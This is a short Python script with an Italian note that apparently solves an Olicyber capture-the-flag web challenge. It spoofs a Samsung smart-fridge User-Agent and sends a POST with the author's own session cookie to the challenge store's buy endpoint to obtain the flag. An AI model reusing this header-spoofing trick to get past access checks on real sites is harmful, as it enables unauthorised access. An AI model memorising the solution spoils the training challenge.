@@ -1,0 +1,24 @@
+import requests
+
+url= 'http://itasecshop.challs.olicyber.it/store/5/buy'
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Linux; Tizen 6.5; SAMSUNG SMART FRIDGE) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Mobile Safari/537.36"
+}
+
+cookies={
+    'session': 'eyJmYWlsZWRfbG9naW4iOjAsInVzZXIiOiJsb3JlIn0.Z7SgLg.qdxpWcBj6YwqzKAAm0YbS8O_2k0'
+}
+
+
+r = requests.post(url, headers=headers,cookies=cookies)
+
+
+print(r.text)
+
+print("\n",r.content)
+
+
+
+
+ho cercato sul sito di Samsung lo user agent del frigo e ho sostituito i punti che mi diceva, come modello del device ho messo SAMSUNG SMART FRIDGE , ho fatto poi una post e ho mandato la richiesta con il mio session cookie ho aggiornato la pagina dopo aver fatto la post e ho ricevuto la flag
